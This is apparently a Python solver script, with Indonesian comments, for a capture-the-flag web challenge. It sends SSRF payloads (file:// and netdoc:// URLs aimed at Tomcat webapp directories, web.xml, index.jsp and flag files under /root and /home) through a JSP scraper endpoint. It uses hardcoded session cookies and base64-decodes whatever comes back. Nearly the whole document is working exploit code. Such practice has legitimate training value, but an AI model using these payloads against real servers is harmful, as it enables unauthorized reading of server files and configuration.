import requests
import base64
import re

# --- KONFIGURASI ---
HOST = "http://gzcli.1pc.tf:41436"
# Ganti dengan JSESSIONID dari log kamu agar session-nya nyambung
COOKIES = {
    "JSESSIONID": "134872213806E695F877D10AC20DFF05", 
    "session": "HmreTJ9IqForTHwKreX8T3I6KdKZFUs4"
}

# Payload yang akan dicoba (Urutan prioritas untuk Java SSRF)
payloads = [
    # 1. Coba Listing Directory (Melihat isi folder aplikasi)
    "file:///usr/local/tomcat/webapps/ROOT/",
    "file:///usr/local/tomcat/webapps/",
    
    # 2. Tebak lokasi Flag di dalam folder aplikasi
    "file:///usr/local/tomcat/webapps/ROOT/flag.txt",
    "file:///usr/local/tomcat/webapps/ROOT/WEB-INF/flag.txt",
    "file:///usr/local/tomcat/webapps/ROOT/META-INF/flag.txt",
    
    # 3. Cek Source Code / Konfigurasi (Siapa tau flag di hardcode di sini)
    "file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml",
    "file:///usr/local/tomcat/webapps/ROOT/index.jsp",
    
    # 4. Cek Home Directory (Karena kita root)
    "file:///root/flag.txt",
    "file:///root/flag",
    "file:///home/ubuntu/flag.txt",
    
    # 5. Payload dengan wrapper netdoc (jika file:// diblokir di folder tertentu)
    "netdoc:///usr/local/tomcat/webapps/ROOT/",
    "netdoc:///usr/local/tomcat/webapps/ROOT/flag.txt"
]

def solve():
    print(f"[+] Target: {HOST}")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    for payload in payloads:
        print(f"\n[*] Trying payload: {payload}")
        
        # 1. INJECT (POST)
        data = {
            "websiteUrl": payload,
            "scrapingType": "html",
            "includeImages": "false"
        }
        
        try:
            r_post = requests.post(f"{HOST}/scraper-handler.jsp", headers=headers, cookies=COOKIES, data=data, allow_redirects=False)
            
            # Kita mengharapkan 302 Redirect (seperti di log kamu)
            if r_post.status_code == 302:
                print("   [+] Injection successful (Got 302 Redirect)")
            else:
                print(f"   [!] Unexpected status on POST: {r_post.status_code}")
                
            # 2. RETRIEVE (GET)
            # Kita request endpoint get-content dengan url yang sama
            r_get = requests.get(f"{HOST}/get-content.jsp", params={"url": payload}, headers=headers, cookies=COOKIES)
            
            if r_get.status_code == 200:
                content = r_get.text.strip()
                
                # Cek apakah isinya pesan error atau base64
                if "Training data not found" in content or len(content) < 5:
                    print("   [-] No data returned.")
                else:
                    try:
                        # Coba decode
                        decoded = base64.b64decode(content).decode('utf-8', errors='ignore')
                        print(f"\n[SUCCESS] CONTENT FOUND FOR: {payload}")
                        print("="*50)
                        print(decoded)
                        print("="*50)
                        if "CTF" in decoded or "{" in decoded:
                            break
                    except:
                        print(f"   [-] Response not Base64: {content[:30]}...")
            else:
                print(f"   [-] Get failed: {r_get.status_code}")

        except Exception as e:
            print(f"   [-] Error: {e}")

if __name__ == "__main__":
    solve()
